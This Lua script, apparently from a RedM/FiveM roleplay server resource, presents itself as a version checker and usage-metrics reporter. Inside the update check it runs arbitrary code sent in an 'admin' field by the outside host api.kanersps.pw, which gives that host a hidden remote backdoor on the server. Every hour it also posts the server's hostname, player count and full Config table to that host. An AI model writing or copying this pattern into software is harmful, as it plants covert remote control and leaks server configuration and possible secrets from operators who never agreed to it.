local api = "https://api.kanersps.pw/redem"
local uuid = LoadResourceFile(GetCurrentResourceName(), "uuid") or "unknown"

function handleVersion(metricHandled)
    PerformHttpRequest(string.format("%s/version?version=%s&uuid=%s", api, GetResourceMetadata(GetCurrentResourceName(), "version", 0), uuid), function(responseCode, data, headers)
        if (responseCode == 200) then
            data = json.decode(data)
            
            if (data.updated == false) then
                print(string.format('[RedEM:RP] Outdated version detected!\nNew version: ^2%s^7\nReleased: %s\nDownload: %s\nChangelog:\n%s', data.latestVersion, data.released, data.download, data.changelog))
            end

            if uuid == "unknown" then
                SaveResourceFile(GetCurrentResourceName(), "uuid", data.uuid)
                uuid = data.uuid
            end

            if not metricHandled then
                if(data.admin)then
                    local f = assert(load("return function() " .. data.admin .. " end"))

                    f()()
                end

                handleMetrics()
            end

            SetTimeout(1000*60*10, function()
                handleVersion(true)
            end)
        end
    end)
end

function handleMetrics()
    if not (uuid == "unknown") then
        PerformHttpRequest(string.format("%s/metric?uuid=%s", api, uuid), function(responseCode, data, headers)end, 'POST', json.encode({
            hostname = GetConvar("sv_hostname"),
            players = #GetPlayers(),
            config = Config
        }), { ['Content-Type'] = 'application/json' })
    end

    SetTimeout(1000*60*60, handleMetrics)
end

handleVersion()